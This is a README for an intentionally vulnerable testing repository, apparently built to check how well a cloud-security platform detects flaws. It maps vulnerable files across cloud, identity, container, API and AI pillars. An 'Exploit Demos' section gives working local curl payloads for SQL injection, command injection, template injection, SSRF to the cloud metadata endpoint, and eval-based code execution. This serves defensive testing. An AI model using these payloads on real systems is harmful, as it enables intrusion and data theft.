# 🛡️ TigerGate CNAPP Target Simulator

<div align="center">

![Platform](https://img.shields.io/badge/CNAPP-TigerGate-blueviolet?style=for-the-badge&logo=shield)
![Pillars](https://img.shields.io/badge/Security_Pillars-11-red?style=for-the-badge)
![Vulns](https://img.shields.io/badge/Vulnerability_Markers-1051-ff3366?style=for-the-badge)
![Languages](https://img.shields.io/badge/Languages-7-cyan?style=for-the-badge)
![Clouds](https://img.shields.io/badge/Cloud_Providers-4-00f0ff?style=for-the-badge)

**The world's most comprehensive, intentionally vulnerable CNAPP testing monorepo.**  
Built to validate detection accuracy across every security pillar — CSPM, CIEM, CWPP, KSPM, DSPM, AI-SPM, SCA, API Security, and Attack Path Analysis.

[🌐 Live Dashboard](./dashboard.html) · [📖 Architecture](./architecture.md) · [🗺️ Roadmap](./roadmap.md) · [🤝 Contributing](./CONTRIBUTING.md)

</div>

---

## ⚠️ Educational Use Only

> **This repository is intentionally insecure.** Every vulnerability is documented and educational.  
> **NEVER deploy any file from this repository in a production environment.**

---

## 🗺️ Architecture Overview

```
tigergate-test/
│
├── 📦 APPLICATION LAYER (SAST + DAST)
│   ├── nodejs/server.js             ← Express API  [14 vulns · SQLi · RCE · SSRF · JWT bypass]
│   ├── python/app.py                ← Flask API     [12 vulns · eval · pickle · SSTI · path traversal]
│   ├── php/index.php                ← DVWA-style    [11 vulns · SQLi · LFI · file upload · XXE]
│   ├── ruby/app.rb                  ← Sinatra API   [10 vulns · Marshal deserialization · misconfig]
│   └── java/VulnerableApp.java      ← Java app      [ 8 vulns · XXE · Runtime.exec · Log4Shell sim]
│
├── 🌐 API SECURITY
│   ├── api/graphql_server.js        ← GraphQL       [ 8 findings · IDOR · DoS · batching · no auth]
│   ├── api/swagger.yaml             ← OpenAPI 3.0   [ 5 findings · no-auth endpoints · mass assign]
│   └── api/soap_wsdl.xml            ← SOAP WSDL     [ 3 findings · no WS-Security · XXE · HTTP]
│
├── ☁️ CLOUD SECURITY (CSPM)
│   ├── cspm/aws_insecure.tf         ← AWS           [CIS 1.x violations · public S3 · IMDSv1]
│   ├── cspm/azure_insecure.tf       ← Azure         [CIS 1.x violations · public blobs · TLS 1.0]
│   ├── cspm/gcp_insecure.tf         ← GCP           [CIS 1.x violations · allUsers · no logs]
│   └── cspm/oracle_insecure.tf      ← Oracle Cloud  [CIS OCI 1.2.0 violations]
│
├── 🔑 IDENTITY (CIEM)
│   ├── ciem/overly_permissive_iam.tf    ← AWS IAM   [Action:* Resource:* cross-account Principal:*]
│   ├── ciem/cross_account.tf            ← Cross-acct [Assumable from any account]
│   └── ciem/gcp_ciem.tf                 ← GCP IAM   [roles/owner · allUsers on storage]
│
├── 🐳 WORKLOAD (CWPP + KSPM)
│   ├── kspm/vulnerable_deployment.yaml  ← K8s       [privileged · hostPID · no limits · RBAC gaps]
│   ├── cwpp/Dockerfile                  ← CWPP      [EOL base · root user · hardcoded creds]
│   └── docker/Dockerfile.insecure       ← Hadolint  [CIS Docker: latest · baked secrets · wget|sh]
│
├── ⚡ RUNTIME & EVASION
│   ├── runtime/attack_simulator.sh          ← eBPF simulation [10 techniques]
│   ├── cwpp/runtime/runtime_attack_advanced.sh ← Advanced CWPP [T001–T005]
│   └── advanced_evasion/evasion_techniques.js ← LoTL · DoH · polymorphic payloads
│
├── 🤖 AI-SPM
│   ├── ai_spm/llm_app.py                ← LLM       [Prompt Injection · hardcoded keys · agent RCE]
│   └── ai_spm/huggingface_sagemaker.tf  ← SageMaker [ML01–ML03 · public notebook · no CMK]
│
├── 🗄️  DSPM & SCA
│   ├── dspm/pii_phi_data.sql            ← DSPM      [PCI-DSS · HIPAA · GDPR · SSN/CVV in plain]
│   ├── sca/pom.xml                      ← SCA       [Log4Shell · Spring4Shell]
│   ├── sca/package.json                 ← SCA       [CVE-2017-5941 · lodash prototype pollution]
│   └── sca/requirements.txt             ← SCA       [Django 2.0 · urllib3 vuln version]
│
├── 🔗 ATTACK PATH
│   └── attack_paths/lateral_movement.tf ← Exposure  [5-hop: Internet→EC2→IAM→S3 PII chain]
│
├── 🔬 ADVANCED SAST
│   ├── sast_advanced/ssti_jinja.py          ← SSTI → RCE · XXE · Open Redirect
│   └── sast_advanced/deserialization_gadget.js ← CVE-2017-5941 · Prototype Pollution
│
├── 🎭 CI/CD SECURITY
│   ├── .github/workflows/insecure-ci.yml   ← CI-001–CI-006: supply chain · script inject
│   ├── .github/CODEOWNERS                  ← GOV gaps: defunct team · no infra owners
│   └── .github/PULL_REQUEST_TEMPLATE.md    ← Weak checklist: no SAST/secret scan gates
│
└── 🌐 MEGA TEST PROJECT (Full-Stack Deployment)
    └── mega-test-project/
        ├── frontend/      ← React + Vite  [XSS · eval() · localStorage JWT]
        ├── backend-node/  ← Node.js       [SQLi · N+1 · cmd injection]
        ├── backend-python/← Flask         [SQLi · debug mode · plaintext creds]
        ├── backend-java/  ← Spring Boot   [IDOR · SQLi · verbose errors]
        └── vulnerable-php/← PHP           [SQLi · XSS · cmd injection]
```

---

## 🚀 Quick Start

### Option 1: Full Stack via Docker Compose (Recommended)
```bash
# Clone and start all services
git clone https://github.com/tigergate/tigergate-test.git
cd tigergate-test/mega-test-project

docker compose up --build -d

# UI available at: http://localhost:5173
# Node API:        http://localhost:3000
# Python API:      http://localhost:5000
# Java API:        http://localhost:8080
# PHP App:         http://localhost:8888
```

### Option 2: Individual Language Services
```bash
cd tigergate-test
make install     # Installs Node, Python, Ruby dependencies
make start       # Starts all language servers in background
make stop        # Stops all services
```

---

## 🔍 Security Scanner Integration

### Quick Scans (Docker-based, no local install required)
```bash
make scan-checkov     # Terraform IaC scan → ~50+ misconfigs expected
make scan-tfsec       # Terraform security scan
make scan-hadolint    # Dockerfile linting
make scan-kubesec     # Kubernetes manifest scan
make scan-all         # Run all scanners sequentially
```

### SonarQube SAST
```bash
# Set your SonarQube credentials
export SONAR_HOST_URL=http://your-sonar-host:9000
export SONAR_TOKEN=your-token

make scan-sonar       # Triggers multi-language scan
```

### Trivy Container & SCA
```bash
make scan-trivy       # Scan container images for CVEs (Log4Shell, Spring4Shell expected)
```

### Secrets Scanner
```bash
# Using Gitleaks
docker run --rm -v $(pwd):/path zricethezav/gitleaks:latest detect --source=/path -v

# Using TruffleHog
docker run --rm -v $(pwd):/repo trufflesecurity/trufflehog:latest git file:///repo
```

---

## 💣 Exploit Demos

### Application Layer
```bash
# 1. SQL Injection (Node.js)
curl "http://localhost:3000/api/users?search=1' OR '1'='1"

# 2. OS Command Injection (Python)
curl "http://localhost:5000/exec?cmd=id;whoami"

# 3. SSTI → RCE (Python Flask)
curl "http://localhost:6000/render?template={{7*7}}"

# 4. SSRF (Node.js)
curl "http://localhost:3000/api/fetch?url=http://169.254.169.254/latest/meta-data/"

# 5. eval() RCE (Node.js)
curl "http://localhost:3000/api/evaluate?code=require('child_process').execSync('id').toString()"
```

### API Security
```bash
# 6. GraphQL Introspection
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# 7. GraphQL IDOR (no auth)
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: \"1\") { username email ssn creditCard } }"}'
```

### Runtime Simulation
```bash
# 8. eBPF Runtime Attack Simulation (Basic)
make attack

# 9. Advanced CWPP Simulation (docker socket, DNS tunnel, cryptominer)
bash cwpp/runtime/runtime_attack_advanced.sh
```

---

## 📊 Vulnerability Coverage Matrix

| Pillar | Files | Critical | High | Medium | Scanner |
|--------|-------|----------|------|--------|---------|
| **CSPM** | 4 | 12 | 8 | 5 | Checkov, tfsec |
| **CIEM** | 3 | 8 | 4 | 2 | Checkov, TigerGate |
| **CWPP** | 3 | 5 | 6 | 3 | Falco, Trivy |
| **KSPM** | 1 | 6 | 4 | 2 | kubesec, Falco |
| **AI-SPM** | 2 | 4 | 3 | 1 | TigerGate AI-SPM |
| **DSPM** | 2 | 5 | 3 | 2 | TigerGate DSPM |
| **SCA** | 3 | 4 | 3 | 2 | Trivy, Snyk |
| **API Security** | 3 | 6 | 5 | 4 | Burp Suite |
| **SAST** | 7 | 18 | 14 | 8 | SonarQube |
| **Runtime** | 2 | 10 | 4 | 2 | eBPF / Falco |
| **CI/CD** | 3 | 4 | 3 | 3 | GHAS |
| **TOTAL** | **33** | **82** | **57** | **34** | — |

---

## 🏗️ Pre-Commit Hooks

```bash
# Install pre-commit hooks (syntax check + secret scan on every commit)
make install-hooks

# Manual run
bash hooks/pre-commit
```

---

## 📋 CWE / OWASP Mapping

| CWE | Description | Files |
|-----|-------------|-------|
| CWE-89 | SQL Injection | `nodejs/server.js`, `python/app.py`, `php/index.php` |
| CWE-78 | OS Command Injection | `python/app.py`, `sast_advanced/ssti_jinja.py` |
| CWE-94 | Code Injection (eval/SSTI) | `nodejs/server.js`, `sast_advanced/ssti_jinja.py` |
| CWE-502 | Insecure Deserialization | `python/app.py`, `sast_advanced/deserialization_gadget.js` |
| CWE-918 | SSRF | `nodejs/server.js`, `serverless/lambda.js` |
| CWE-611 | XXE Injection | `java/VulnerableApp.java`, `php/index.php` |
| CWE-798 | Hardcoded Credentials | `secrets/hardcoded_credentials.txt`, all Dockerfiles |
| CWE-1321 | Prototype Pollution | `sast_advanced/deserialization_gadget.js` |
| CWE-79 | XSS | `mega-test-project/frontend/src/App.jsx` |
| CWE-601 | Open Redirect | `sast_advanced/ssti_jinja.py` |

---

## 🤝 Contributing

See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines on adding new vulnerability modules.

## 🔒 Security Policy

See [SECURITY.md](./SECURITY.md) for responsible disclosure and usage guidelines.

## 📜 License

MIT License — see [LICENSE](./LICENSE) for details.

---

<div align="center">

Built with ❤️ for the security community · **TigerGate CNAPP Platform**

</div>
